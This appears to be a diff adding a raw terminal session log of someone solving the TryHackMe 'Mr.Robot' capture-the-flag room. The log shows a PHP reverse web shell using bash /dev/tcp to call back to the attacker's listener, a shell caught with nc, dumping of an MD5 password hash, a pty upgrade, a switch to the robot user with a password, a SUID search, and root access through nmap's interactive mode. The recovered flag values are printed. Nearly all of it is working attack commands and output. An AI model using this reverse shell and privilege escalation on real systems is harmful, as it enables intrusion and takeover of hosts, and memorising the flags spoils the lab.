@@ -1,0 +1,148 @@
+Script started on 2020-11-01 20:19:53-03:00 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="166" LINES="39"]
+]0;root@Pentest: /home/joaof/TryJao/TryHackMe/Mr.Robot[1;31mroot@Pentest[00m:[1;34m/home/joaof/TryJao/TryHackMe/Mr.Robot[00m# cat wpshell.php 
+<?php
+//Reverse WebShell - 404.php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.29/443 0>&1'");
+?>
+
+
+]0;root@Pentest: /home/joaof/TryJao/TryHackMe/Mr.Robot[1;31mroot@Pentest[00m:[1;34m/home/joaof/TryJao/TryHackMe/Mr.Robot[00m# ifconfig tun0
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet 10.9.185.104  netmask 255.255.0.0  destination 10.9.185.104
+        inet6 fe80::9bc5:b5f9:68a8:e198  prefixlen 64  scopeid 0x20<link>
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (Não Especificado)
+        RX packets 11974  bytes 14068787 (13.4 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 9709  bytes 605508 (591.3 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+]0;root@Pentest: /home/joaof/TryJao/TryHackMe/Mr.Robot[1;31mroot@Pentest[00m:[1;34m/home/joaof/TryJao/TryHackMe/Mr.Robot[00m# nc -vnlp 443
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.198.134.
+Ncat: Connection from 10.10.198.134:54048.
+bash: cannot set terminal process group (1741): Inappropriate ioctl for device
+bash: no job control in this shell
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ 
+
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ cd /home
+cd /home
+daemon@linux:/home$ ls
+ls
+robot
+daemon@linux:/home$ 
+
+daemon@linux:/home$ cd roboy t
+cd robot
+daemon@linux:/home/robot$ ls
+ls
+key-2-of-3.txt
+password.raw-md5
+daemon@linux:/home/robot$ cat pwd  ass	word.rw aw-md5
+cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+daemon@linux:/home/robot$ 
+
+daemon@linux:/home/robot$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+cat: key-2-of-3.txt: Permission denied
+daemon@linux:/home/robot$ 
+
+daemon@linux:/home/robot$ python -c 'import pty;pty.spq anw  wn("/bin/bas   sh")'
+python -c 'import pty;pty.spawn("/bin/sh")'
+$ ls
+ls
+key-2-of-3.txt	password.raw-md5
+$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+cat: key-2-of-3.txt: Permission denied
+$ sudo      sudo robot
+sudo robot
+[sudo] password for daemon: abcdefghijklmnopqrstuvwxyz^C
+]0;root@Pentest: /home/joaof/TryJao/TryHackMe/Mr.Robot[1;31mroot@Pentest[00m:[1;34m/home/joaof/TryJao/TryHackMe/Mr.Robot[00m# nc -vnlp 443
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.198.134.
+Ncat: Connection from 10.10.198.134:54050.
+bash: cannot set terminal process group (1741): Inappropriate ioctl for device
+bash: no job control in this shell
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ cd /hom	e/b robot
+cd /home/robot
+daemon@linux:/home/robot$ ls
+ls
+key-2-of-3.txt
+password.raw-md5
+daemon@linux:/home/robot$ 
+
+daemon@linux:/home/robot$ su robot
+su robot
+su: must be run from a terminal
+daemon@linux:/home/robot$ 
+
+daemon@linux:/home/robot$ python -c " 'import pty;pty.spawn("/bin/bash    sh")'
+python -c 'import pty;pty.spawn("/bin/sh")'
+$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:~$ 
+
+robot@linux:~$ ls
+ls
+key-2-of-3.txt	password.raw-md5
+robot@linux:~$ cay t key-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+robot@linux:~$ 
+
+robot@linux:~$ find    fin  d / p -perm -4000 type      -type f 2> /null/     dev/null
+find / -perm -4000 -type f 2> /dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+robot@linux:~$ 
+
+robot@linux:~$ nmap --interactive
+nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+!sh
+# id
+id
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+# whoami
+whoami
+root
+# cd /root
+cd /root
+# ls
+ls
+firstboot_done	key-3-of-3.txt
+# cat key-3-of-3.txt
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+# 
+
+# ^C
+]0;root@Pentest: /home/joaof/TryJao/TryHackMe/Mr.Robot[1;31mroot@Pentest[00m:[1;34m/home/joaof/TryJao/TryHackMe/Mr.Robot[00m# exit
+exit
+
+Script done on 2020-11-01 20:40:18-03:00 [COMMAND_EXIT_CODE="130"]
